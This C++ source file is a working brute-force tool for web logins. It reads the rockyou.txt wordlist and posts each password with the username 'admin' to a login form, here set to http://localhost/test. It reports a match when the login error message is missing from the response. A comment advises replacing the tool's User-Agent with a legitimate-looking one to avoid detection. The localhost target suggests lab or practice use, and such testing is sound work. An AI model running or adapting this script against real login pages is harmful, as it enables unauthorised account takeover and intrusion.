#include "requests.hpp"
#include <iostream>
#include <fstream>
#include <string>
#include <string_view>
#include <map>
#include <algorithm>

std::vector<std::string> readPasswords(const std::string_view &path);

void bruteIt(const std::vector<std::string> &passwordList);

int main()
{
    const std::string_view wordlistPath = "/opt/wordlists/rockyou.txt";
    std::vector<std::string> passwordList = readPasswords(wordlistPath);
    bruteIt(passwordList);
}

std::vector<std::string> readPasswords(const std::string_view &path)
{
    std::ifstream fin;
    fin.open(path.data(), std::ios::in);
    std::vector<std::string> passwords;

    std::string temp;
    while (std::getline(fin, temp))
        passwords.push_back(temp);

    fin.close();
    return passwords;
}

void bruteIt(const std::vector<std::string> &passwordList)
{
    constexpr std::string_view username = "admin";
    constexpr std::string_view url = "http://localhost/test";
    constexpr std::string_view valueToSearch = "Incorrect username/password"; // The error message when the login fails

    const std::map<std::string, std::string> header = {
        {"User-Agent", "Bruteforcer"}, // Should change this to a legit user agent
        {"Content-Type", "application/x-www-form-urlencoded"},
    };

    for (const auto &password : passwordList)
    {
        std::cout << "Trying username:" << username.data() << " password:" << password.data() << '\n';
        const std::map<std::string, std::string> data = {
            {"username", username.data()},
            {"password", password.data()},
        };
        requests::Requests r = requests::Requests();
        r.post(url.data(), data, header);
        const std::string response = r.get_response();
        // If there is no error message means the password is correct
        if (
            auto it = std::search(response.begin(), response.end(), std::boyer_moore_searcher(valueToSearch.begin(), valueToSearch.end()));
            it == response.end())
        {
            std::cout << "Found!!" << '\n';
            std::cout << "username: " << username << " password: " << password << '\n';
            break;
        }
    }
}
